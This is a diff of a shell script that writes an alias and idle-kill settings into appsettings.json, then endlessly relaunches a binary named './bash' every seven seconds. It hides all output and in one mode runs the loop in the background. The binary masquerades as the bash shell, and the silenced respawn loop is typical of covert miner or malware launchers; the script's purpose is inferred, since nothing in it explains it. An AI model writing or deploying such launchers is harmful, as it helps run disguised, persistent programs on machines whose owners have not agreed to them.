@@ -44,10 +44,12 @@ sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
 [ -n "$idlePid" ] && sed -i "s/\"idleSettings\":.*/\"idleSettings\": {\"command\": \"kill\", \"arguments\": \"-10 $idlePid\"},/" "${work}/appsettings.json"
 
 
+cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
+
 if [ "$mode" == "0" ]; then
-  bash -c "while true; do cd "${work}"; ./bash >/dev/null 2>&1 ; sleep 7; done" >/dev/null 2>&1 &
+  bash <(echo "$cmd") >/dev/null 2>&1 &
 else
-  while true; do cd "${work}"; ./bash >/dev/null 2>&1 ; sleep 7; done
+  bash <(echo "$cmd")
 fi
 
 
